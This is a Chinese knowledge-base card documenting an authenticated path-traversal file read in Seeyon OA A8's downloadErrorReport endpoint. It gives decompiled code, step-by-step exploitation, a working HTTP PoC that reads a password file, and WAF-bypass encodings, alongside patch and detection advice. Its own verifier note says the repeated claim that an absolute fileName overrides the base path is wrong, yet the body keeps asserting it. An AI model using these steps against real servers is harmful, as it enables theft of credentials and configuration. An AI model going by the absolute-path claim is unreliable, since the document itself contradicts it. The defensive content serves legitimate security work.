---
id: web-generic-file-inclusion-seeyon-aiedoc-correct-downloaderrorreport
title: 致远 OA A8 AIEdocCorrectController downloadErrorReport 后台任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: seeyon-aiedoc-downloaderrorreport-filename-traversal-read
tags:
- java
- seeyon
- oa
- path-traversal
- arbitrary-file-read
- file-download
- authenticated
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:36:34+08:00'
  notes: 已对照原文及8张图核对：图01确认downloadErrorReport取fileName后Paths.get(ERROR_REPORT_PATH,当前用户ID,fileName)→new File→FileInputStream→IOUtility.copy回显；图02确认copy无过滤；图03-05确认/aiedoc/correct.do bean与AIEdocCorrectController→AIEdocController→BaseController继承及@CheckRoleAccess；图06/08确认读取password.txt返回ceshi/123456；图07确认补丁new File(fileName).getName()。问题：卡片在“原理”和“变体”中称fileName传绝对路径会替换/忽略base，但代码用的是Paths.get(base,userId,fileName)（字符串拼接，类似new File(parent,child)），绝对路径在Unix会被拼到base后、Windows含盘符会InvalidPathException，并不会重置为绝对路径；应删除该说法或改为仅../穿越可用（可用../逐级跳出）。其余主链成立。未验证点：原文路径脱敏，需按ERROR_REPORT_PATH深度调整../；需后台权限；未本机复跑；frontmatter无source_url。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-seeyon-aiedoc-correct-downloaderrorreport/
draft: false
kb_aliases:
- 致远 OA 任意文件读取
- AIEdocCorrectController
- downloadErrorReport
- aiedoc/correct.do
- fileName 路径穿越读取
- 智能公文任意文件读取
- Seeyon A8 文件读取
---

## 一句话结论

致远 OA A8-8.2SP1 的 `AIEdocCorrectController.downloadErrorReport` 直接取请求参数 `fileName` 拼入 `Paths.get(AIEdocConstant.ERROR_REPORT_PATH, 当前用户ID, fileName)`，再用 `new FileInputStream(file)` + `IOUtility.copy(in, response.getOutputStream())` 回显文件内容；有后台权限的攻击者用 `../` 或绝对路径即可读取服务器上任意进程可读文件（补丁仅用 `new File(fileName).getName()` 去掉目录部分）。

## 原理

- **路由与入口**：Spring 配置 `spring-aiedocorrect-controller.xml` 中注册 `<bean name="/aiedoc/correct.do" class="...AIEdocCorrectController">`，请求通过 `method` 参数分发到 `downloadErrorReport`。
- **继承链与权限**：`AIEdocCorrectController extends AIEdocController extends BaseController`；`AIEdocController` 上有 `@CheckRoleAccess(resourceCode={"ocr_auth","correc_auth","sensitiveWord_auth","assist_auth"})`，因此该接口属于后台功能点，需要对应角色权限（原文使用已登录后台的 JSESSIONID）。
- **危险拼接**：漏洞代码（反编译）：

  ```java
  public void downloadErrorReport(HttpServletRequest request, HttpServletResponse response) {
      String fileName = request.getParameter("fileName");
      String filePath = Paths.get(AIEdocConstant.ERROR_REPORT_PATH,
              String.valueOf(AppContext.getCurrentUser().getId()), fileName).toString();
      File file = new File(filePath);
      if (file.exists()) {
          try {
              InputStream in = new FileInputStream(file);
              OutputStream out = response.getOutputStream();
              response.setContentType("application/x-msdownload; charset=UTF-8");
              response.setHeader("Content-disposition",
                  "attachment;" + FileUtils.getDownloadFileName(request, fileName));
              IOUtility.copy(in, out);
          } catch (Exception e) { LOGGER.error(e.getMessage(), e); }
      }
  }
  ```

  `Paths.get(base, userId, fileName)` 与 `new File(parent, child)` 一样只做路径拼接；`fileName` 为用户可控字符串，包含 `../` 时会逐级跳出 `ERROR_REPORT_PATH/<userId>/`，绝对路径则会直接替换整条路径。
- **无过滤的拷贝 sink**：`IOUtility.copy(InputStream, OutputStream)` 只是 `input.read(buffer)` → `output.write(buffer)` 循环，不校验来源/路径，因此读到的字节原样写入 HTTP 响应，形成有回显的任意文件下载。
- **为什么补丁有效**：官方补丁在取参后加 `fileName = (new File(fileName)).getName();`，只保留最后一段文件名，去掉 `../` 与目录部分，使最终路径固定在该用户目录下；这是“先净化为 basename”的修复方式。
- **危害**：可读取应用配置、数据库连接口令、密钥、日志、其他用户上传文件等；原文截图读取 `password.txt` 得到 `ceshi/123456`。若读到管理员口令或数据库凭据，可进一步横向。

## 触发条件

- 目标为致远 OA A8-8.2SP1（或未打 202408 智能公文任意文件读取补丁的版本）。
- 攻击者拥有后台账号且具备 `ocr_auth`/`correc_auth`/`sensitiveWord_auth`/`assist_auth` 之一对应角色（后台功能点）。
- `/aiedoc/correct.do` 可访问，`method=downloadErrorReport` 分发正常。
- 目标文件对应用进程可读，且 `file.exists()` 为 true（不存在则无响应内容）。
- 未部署拦截 `fileName` 中 `../` 或绝对路径的 WAF/RASP。

## 利用步骤

1. 登录致远 OA 后台，取得有效会话 Cookie（原文请求携带 `JSESSIONID`）。
2. 访问 `/aiedoc/correct.do?method=downloadErrorReport`，先传一个已知存在的文件名确认接口行为（可先用错误文件名观察 200/空响应差异）。
3. 在 `fileName` 中使用 `../` 逐级跳出 `ERROR_REPORT_PATH/<userId>/`，或直接使用绝对路径（Windows 盘符/UNC，Linux `/etc/passwd`）。
4. 观察响应头 `Content-disposition: attachment` 与响应体是否返回文件内容；响应 200 且体为文件字节即成功。
5. 读取应用配置、数据库口令、密钥等；必要时结合其他漏洞进一步利用。
6. 注意路径层级：`ERROR_REPORT_PATH` 的实际深度决定 `../` 数量，可逐步增加并观察 `file.exists()` 导致的空/非空响应。

## PoC

原文 Burp 请求（路径与参数值有脱敏，方法名与参数结构保持）：

```http
GET /<context>/aiedoc/correct.do?method=downloadErrorReport&fileName=../../../../<path>/password.txt HTTP/1.1
Host: 192.168.100.11
Cookie: JSESSIONID=<后台会话>; ts=1766733558191; login_locale=zh_CN; ...
User-Agent: Mozilla/5.0
```

```http
HTTP/1.1 200
Content-disposition: attachment;filename="password.txt"
Content-Type: application/x-msdownload;charset=UTF-8
Content-Length: 12

ceshi/123456
```

原文通过该请求读取到 `password.txt` 内容 `ceshi/123456`，证明 `fileName` 可穿越并直接回显。

## 变体与关联

- **绝对路径**：`fileName=/etc/passwd` 或 Windows `C:\Windows\win.ini`，`Paths.get` 会忽略前面的 base。
- **编码/过滤绕过**：若前置 WAF 只拦明文 `../`，可尝试 URL 编码、双重编码、`..%5c`、`....//` 等，取决于解码与过滤顺序。
- **其他方法**：同一 Controller 或父类中其他以文件名/路径为参数的方法可能复用相同 sink，可审计 `IOUtility.copy`、`FileInputStream`、`Paths.get` 的调用点。
- **补丁绕过**：修复使用 `new File(fileName).getName()`，仅取 basename；若其他入口仍使用原始参数或对 basename 处理不当，需单独审计。
- **关联卡片**：[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（Java `new File(root, path)` + FileInputStream/FileUtils 的通用原理）、[[web-generic-file-inclusion-oa-logfiledownload-createfwfromjoa-arbitrary-read]]（同类 OA 下载/转发读取）、[[web-java-component-seeyon-autoinstall-login-locale-zip-traversal]]（致远 OA 另一处路径穿越下载）。

## 检测与防御

- **升级/补丁**：安装致远官方“智能公文任意文件读取漏洞补丁-202408-S001-A8&A6&G6&N_V8.2-V9.0”，确认 `downloadErrorReport` 已对 `fileName` 取 basename 或做 canonical 校验。
- **代码修复**：使用 `Path base = Paths.get(ERROR_REPORT_PATH, userId).toRealPath(); Path target = base.resolve(fileName).normalize(); if (!target.startsWith(base)) reject;`；只接受文件 ID/白名单文件名，不接受路径。
- **权限与最小化**：后台接口强认证与角色校验；应用进程最小权限；敏感配置/密钥不放在 Web 进程可读目录；数据库账户最小权限。
- **检测**：请求 `/aiedoc/correct.do` 的 `fileName` 含 `../`、`..\`、`%2e%2e`、绝对路径、盘符；响应头 `Content-disposition: attachment` 但文件名异常；同一会话批量读取不同目录文件；响应体出现 `password`、`jdbc:`、私钥头等特征。
